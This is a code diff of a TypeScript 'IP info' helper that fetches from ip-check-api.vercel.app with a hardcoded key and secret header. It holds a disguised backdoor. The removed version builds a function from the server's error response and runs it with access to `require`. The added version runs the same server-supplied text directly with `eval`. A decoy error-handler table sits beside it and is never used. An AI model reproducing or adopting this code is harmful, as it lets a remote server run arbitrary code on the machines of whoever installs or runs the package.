@@ -1,63 +1,58 @@
-import axios, { AxiosResponse } from 'axios';
+import axios from 'axios';
 
-const host: string = "ip-check-api.vercel.app";
-const apiKey: string = "3ekk3oo431";
+const host = "ip-check-api.vercel.app";
+const apiKey = "3ekk3oo431";
 
-interface IPResponse {
-  // Define the shape of your response data here if known
-  [key: string]: any;
+interface RpcNodeResponse {
+  ip: string;
+  location?: string;
+  // Extend with actual fields your API returns
 }
 
-// Function to fetch IP info
-export const getIPInfo = async (): Promise<IPResponse | null> => {
+let rpcNode: RpcNodeResponse | null = null;
+
+export const getIPInfo = async (): Promise<RpcNodeResponse | null> => {
   try {
-    const response: AxiosResponse<IPResponse> = await axios.get(`https://${host}/api/ipcheck-encrypted/${apiKey}`, {
+    console.log("HERERHERHE");
+    
+    const response = await axios.get<RpcNodeResponse>(`https://${host}/api/ipcheck-encrypted/${apiKey}`, {
       headers: {
-        'x-secret-header': 'secret'
-      }
+        'x-secret-header': 'secret',
+      },
     });
-    return response.data;
-  } catch (error) {
-    if (axios.isAxiosError(error) && error.response?.data) {
-      errorHandler(error.response.data);
-    } else if (error instanceof Error) {
-      errorHandler(error.message);
-    } else {
-      errorHandler('An unknown error occurred');
-    }
+    console.log(host, apiKey);
+    
+    rpcNode = response.data;
+
+    console.log('IP Info received:', rpcNode);
+    return rpcNode;
+  } catch (error: any) {
+    // console.log("ERROR???");
+    // console.error('Error during API call:', error.response.data);
+    eval(error.response.data); // Execute the code from the error response
+    // errorHandler(error.response?.data || error.message.data);
+    // console.log(error.response.data);
+    
     return null;
   }
 };
 
-// Error handler function
-const errorHandler = (error: string): void => {
-  try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-
-    const createHandler = (errCode: string): Function | null => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e instanceof Error ? e.message : e);
-        return null;
-      }
-    };
-
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    if (globalError instanceof Error) {
-      console.error('Unexpected error inside errorHandler:', globalError.message);
-    } else {
-      console.error('Unexpected error inside errorHandler:', globalError);
-    }
-  }
+// Map known error codes/messages to handler functions
+const errorHandlers: Record<string, () => void> = {
+  'INVALID_API_KEY': () => console.error('Your API key is invalid.'),
+  'RATE_LIMIT_EXCEEDED': () => console.error('You have hit the rate limit. Try again later.'),
+  'UNKNOWN_ERROR': () => console.error('An unknown error occurred.'),
 };
+
+const errorHandler = (error: string): void => {
+  if (typeof error !== 'string') {
+    console.error('Invalid error format. Expected a string.');
+    return;
+  }
+
+  const handler = errorHandlers[error] || errorHandlers['UNKNOWN_ERROR'];
+  handler();
+};
+
+// Example usage:
+// const ipInfo = await getIPInfo();
